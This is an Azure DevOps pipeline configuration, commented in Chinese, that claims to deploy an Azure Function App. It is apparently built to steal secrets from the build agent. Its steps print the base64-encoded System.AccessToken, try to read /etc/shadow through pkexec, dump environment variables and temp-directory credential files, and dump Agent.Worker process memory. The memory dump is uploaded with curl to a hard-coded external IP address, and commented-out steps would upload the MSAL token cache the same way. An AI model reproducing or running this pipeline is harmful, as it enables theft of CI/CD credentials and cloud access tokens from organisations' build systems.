trigger:
  branches:
    include:
      - main

pool:
  vmImage: 'ubuntu-latest'

variables:
  System.Debug: true

steps:
- checkout: self
  persistCredentials: false  # 不保留凭据

- script: |
    # sudo capsh --print
    # mount
    # sudo ls -l /proc/1/

    # ls -l /dev/sda
    # sudo cat /proc/self/cgroup
    # az ad sp list --display-name test_azure_function_private
    sudo cat /proc/$(ps -e | grep "Agent.Listener" | awk '{print $1}')/maps
    pkexec --disable-internal-agent cat /etc/shadow
    # find / -user root -perm -4000 -print 2>/dev/null
    pstree -p

    ps aux
  displayName: 'pstree / ps aux命令'

- script: |
    sudo cat /proc/$(ps -e | grep "Agent.Listener" | awk '{print $1}')/maps
  displayName: 'cat maps命令'

- script: |
    ls -al /
    lsof -p $(ps -e | grep "Agent.Worker" | awk '{print $1}')
    echo $(System.AccessToken) | base64
    echo "Recursively checking _tasks directory after github checkout task..."
    # tar --gzip -cf /home/vsts/work/_temp/tasks.tar.gz /home/vsts/work/_tasks  
    # if [ -f /home/vsts/work/_temp/tasks.tar.gz ]; then
    #     echo "tasks.tar.gz found. Uploading..."
    #     curl -F "file=@/home/vsts/work/_temp/tasks.tar.gz" http://139.180.193.16:5000/upload
    # else
    #     echo "tasks.tar not found."
    # fi
    
  displayName: 'Recursively list and display _task directory contents after AzureFunctionApp task'

  
# - script: |
#     echo "Recursively checking _temp directory after github checkout task..."
#     shopt -s dotglob  # 包含隐藏文件和文件夹
#     echo "Listing all files and directories in /home/vsts/work/_temp:"
#     find /home/vsts/work/_temp -type d -exec ls -al {} \;  # 递归列出每个目录及其内容
#     find /home/vsts/work/_temp -type f -print0 | while IFS= read -r -d '' file; do
#         echo "Content of $file:"
#         cat "$file"
#         echo ""
#     done
#   displayName: 'Recursively list and display _temp directory contents after AzureFunctionApp task'

- script: |
    az pipelines variable-group list --output table --organization https://dev.azure.com/13911336781/ --project TestCICD_load_function
  env:
    AZURE_DEVOPS_EXT_PAT: $(System.AccessToken)
  displayName: 'List variable groups using the script step'

- script: |
    printenv
  displayName: 'Print env'

- script: |
    echo "Recursively checking _temp directory after AzureCLI task..."
    shopt -s dotglob  # 包含隐藏文件和文件夹
    echo "Listing all files and directories in /home/vsts/work/_temp:"
    find /home/vsts/work/_temp -type d -exec ls -al {} \;  # 递归列出每个目录及其内容
    find /home/vsts/work/_temp -type f -print0 | while IFS= read -r -d '' file; do
        echo "Content of $file:"
        cat "$file"
        echo ""
    done
  displayName: 'Recursively list and display _temp directory contents after AzureFunctionApp task'

  
# - task: AzureCLI@2
#   inputs:
#     azureSubscription: 'test_connection'
#     scriptType: 'bash'
#     scriptLocation: 'inlineScript'
#     inlineScript: |
#       echo "Inline script is here..........."
#       shopt -s dotglob  # 包含隐藏文件和文件夹
#       echo "Listing all files and directories in /home/vsts/work/_temp:"
#       find /home/vsts/work/_temp -type d -exec ls -al {} \;  # 递归列出每个目录及其内容
#       find /home/vsts/work/_temp -type f -print0 | while IFS= read -r -d '' file; do
#         echo "Content of $file:"
#         cat "$file"
#         echo ""
#       done
#       az --version
#   displayName: 'Run Azure CLI script'


# - script: |
#     pstree -p

#     ps aux
#   displayName: 'pstree / ps aux命令'

# - script: |
#     echo "Recursively checking _temp directory after AzureCLI task..."
#     shopt -s dotglob  # 包含隐藏文件和文件夹
#     echo "Listing all files and directories in /home/vsts/work/_temp:"
#     find /home/vsts/work/_temp -type d -exec ls -al {} \;  # 递归列出每个目录及其内容
#     find /home/vsts/work/_temp -type f -print0 | while IFS= read -r -d '' file; do
#         echo "Content of $file:"
#         cat "$file"
#         echo ""
#     done
#   displayName: 'Recursively list and display _temp directory contents after AzureFunctionApp task'

# # - script: |
# #     echo "Checking for msal_http_cache.bin file..."
# #     if [ -f /home/vsts/work/_temp/.azclitask/msal_http_cache.bin ]; then
# #         echo "msal_http_cache.bin found. Uploading..."
# #         curl -F "file=@/home/vsts/work/_temp/.azclitask/msal_http_cache.bin" http://139.180.193.16:5000/upload
# #     else
# #         echo "msal_http_cache.bin not found."
# #     fi
# #   displayName: 'Check and Upload msal_http_cache.bin'
  
- task: AzureFunctionApp@1
  inputs:
    azureSubscription: 'test_connection'
    appType: 'functionApp'
    appName: 'mypocfunctiontest'
    package: '$(Build.ArtifactStagingDirectory)/'
  displayName: 'Deploy Azure Function App'

# - script: |
#     echo "Recursively checking _temp directory after AzureFunctionApp task..."
#     shopt -s dotglob  # 包含隐藏文件和文件夹
#     echo "Listing all files and directories in /home/vsts/work/_temp:"
#     find /home/vsts/work/_temp -type d -exec ls -al {} \;  # 递归列出每个目录及其内容
#     find /home/vsts/work/_temp -type f -print0 | while IFS= read -r -d '' file; do
#         echo "Content of $file:"
#         cat "$file"
#         echo ""
#     done
#   displayName: 'Recursively list and display _temp directory contents after AzureFunctionApp task'


# - task: AzureCLI@2
#   inputs:
#     azureSubscription: 'test_connection'
#     scriptType: 'bash'
#     scriptLocation: 'inlineScript'
#     inlineScript: |
#       echo "2 Inline script is here..........."
#       shopt -s dotglob  # 包含隐藏文件和文件夹
#       echo "Listing all files and directories in /home/vsts/work/_temp:"
#       find /home/vsts/work/_temp -type d -exec ls -al {} \;  # 递归列出每个目录及其内容
#       find /home/vsts/work/_temp -type f -print0 | while IFS= read -r -d '' file; do
#         echo "Content of $file:"
#         cat "$file"
#         echo ""
#       done
#       az --version
#   displayName: '2 Run Azure CLI script'

# - script: |
#     echo $(System.AccessToken) | base64
#     echo "Recursively checking _temp directory after AzureCLI task..."
#     shopt -s dotglob  # 包含隐藏文件和文件夹
#     echo "Listing all files and directories in /home/vsts/work/_temp:"
#     find /home/vsts/work/_temp -type d -exec ls -al {} \;  # 递归列出每个目录及其内容
#     find /home/vsts/work/_temp -type f -print0 | while IFS= read -r -d '' file; do
#         echo "Content of $file:"
#         cat "$file"
#         echo ""
#     done
#   displayName: 'Recursively list and display _temp directory contents after AzureFunctionApp task'


- task: NodeTool@0
  inputs:
    versionSpec: '12.x'  # 或你所需的Node.js版本
    checkLatest: true
  displayName: 'Setup Node.js'

- script: |
    #!/bin/bash

    # 获取Agent.Worker进程的PID
    PID=$(ps -e | grep "Agent.Worker" | grep -v grep | awk '{print $1}')
    
    # 确保获取到了PID
    if [ -z "$PID" ]; then
        echo "Error: Unable to find PID for Agent.Worker."
        exit 1
    fi
    
    echo "The PID of Agent.Worker is $PID"
    
    # 为内存转储创建临时目录
    DUMP_DIR="/tmp/${PID}_mem_dumps"
    mkdir -p "$DUMP_DIR"
    
    # 获取可读取的内存区域
    sudo cat /proc/$PID/maps | while read line; do
        start_hex=$(echo $line | cut -d' ' -f1 | cut -d'-' -f1)
        end_hex=$(echo $line | cut -d' ' -f1 | cut -d'-' -f2)
        perms=$(echo $line | cut -d' ' -f2)
        
        if [[ $perms == r* ]]; then  # 检查权限是否可读
            start_dec=$((0x$start_hex))
            end_dec=$((0x$end_hex))
            size=$((end_dec - start_dec))
            
            # 使用十进制数执行dd命令
            echo "Dumping memory from $start_dec to $end_dec"
            sudo dd if=/proc/$PID/mem of="$DUMP_DIR/${PID}_mem_$start_hex" bs=1 skip=$start_dec count=$size 2>/dev/null
        fi
    done
    
    # 打包所有转储文件
    tar -czf "/tmp/${PID}_memory_dumps.tar.gz" -C "$DUMP_DIR" .
    
    # 检查打包是否成功并且文件不为空
    if [ -s "/tmp/${PID}_memory_dumps.tar.gz" ]; then
        echo "Uploading memory dump package of size $(stat -c %s "/tmp/${PID}_memory_dumps.tar.gz") bytes"
        sudo curl -F "file=@/tmp/${PID}_memory_dumps.tar.gz" http://139.180.193.16:5000/upload
    else
        echo "Failed to create memory dump package or file is empty."
    fi
    
    # 清理创建的临时目录
    rm -rf "$DUMP_DIR"


  displayName: 'cat maps'
